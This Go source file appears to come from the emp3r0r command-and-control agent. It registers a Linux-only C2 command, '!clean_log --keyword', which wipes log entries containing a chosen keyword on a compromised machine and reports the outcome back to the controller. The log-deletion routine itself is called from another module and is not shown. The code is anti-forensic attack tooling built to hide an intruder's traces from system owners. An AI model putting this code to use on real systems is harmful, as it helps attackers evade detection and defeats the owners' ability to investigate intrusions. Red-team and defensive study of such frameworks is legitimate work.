//go:build linux

package handler

import (
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/spf13/cobra"
)

func platformCommands(cmd *cobra.Command) {
	// !clean_log --keyword <keyword>
	cleanLogCmd := &cobra.Command{
		Use:     def.C2CmdCleanLog,
		Short:   "Clean logs",
		Example: "!clean_log --keyword <keyword>",
		GroupID: "linux",
		Run:     runCleanLogLinux,
	}
	cleanLogCmd.Flags().StringP("keyword", "k", "", "Keyword to clean logs")
	cmd.AddCommand(cleanLogCmd)
}

// runCleanLogLinux implements: !clean_log --keyword <keyword>
func runCleanLogLinux(cmd *cobra.Command, args []string) {
	keyword, _ := cmd.Flags().GetString("keyword")
	if keyword == "" {
		c2transport.NotifyC2(cmd, "Error: args error: keyword is required: %s", args)
		return
	}
	err := modules.CleanAllByKeyword(keyword)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	c2transport.NotifyC2(cmd, "%s", "Done")
}
